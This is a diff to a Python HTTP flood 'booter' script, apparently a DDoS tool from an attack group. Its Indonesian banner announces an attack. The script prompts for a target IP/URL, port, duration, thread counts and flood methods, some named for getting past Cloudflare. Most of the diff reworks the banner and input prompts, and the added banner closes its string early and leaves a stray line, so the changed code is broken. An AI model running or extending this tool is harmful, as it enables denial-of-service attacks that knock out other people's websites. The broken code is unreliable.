@@ -114,21 +114,21 @@ banner = f"""
 {Fore.RED}┣{Fore.WHITE}            BRIGADE ATTACKERS ZNEEPER ELITE
 {Fore.RED}┣{Fore.GREEN}                     INTERNAL SCRIFT
 {Fore.RED}┣{Fore.YELLOW}                       BY: KF'24
-{Fore.RED}┣ 
-{Fore.RED} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{Fore.LIGHTYELLOW_EX}SC INI MEMVUTUHKAN 35 DETIK UTK MELAKUKAN SERANGAN{Fore.RESET}"""
+{Fore.RED}┣{Fore.BLUE}                          —oO0Oo—
+{Fore.RED} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+{Fore.LIGHTYELLOW_EX}SC INI MEMVUTUHKAN 35 DETIK UTK MELAKUKAN SERANGAN{Fore.RESET}")
 print(banner)
 host = ""
 ip = ""
-target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
-port_loader = int(input(f"{Fore.YELLOW}PORT>"))
+target_loader = input(f"{Fore.LIGHTYELLOW_EX}┣━━━━━━⟩⟩ IP/URL>")
+port_loader = int(input(f"{Fore.YELLOW}┣━━━━━━⟩⟩ PORT>"))
 time_loader = time.time() + int(input(f"{Fore.BLUE}TIME (DEFAULT=250)>"))
 spam_loader = int(input(f"{Fore.YELLOW}SPAM THREAD (DEFAULT=50 OR 200)>"))
 create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=35)>"))
 booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=400)>"))
 print(f"{Fore.LIGHTCYAN_EX}EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD ")
-print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> SERVER CLOUDFLARE AGE PYFLOODER GET or POST")
-methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=G)>")
+print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
+methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
 print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
 try:
     host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
@@ -146,4 +146,4 @@ for loader_num in range(create_thread):
 clear_text()
 print(banner)
 status_code = True
-print(f"{Fore.GREEN}TRYING SENT . . . . PAKETMU AKAN DIKIRIM OLEH KURIR ZAN...!!💯🔥🔥⚡{Fore.RESET}")
+print(f"{Fore.GREEN}TRYING SENT . . . . {Fore.RESET}")
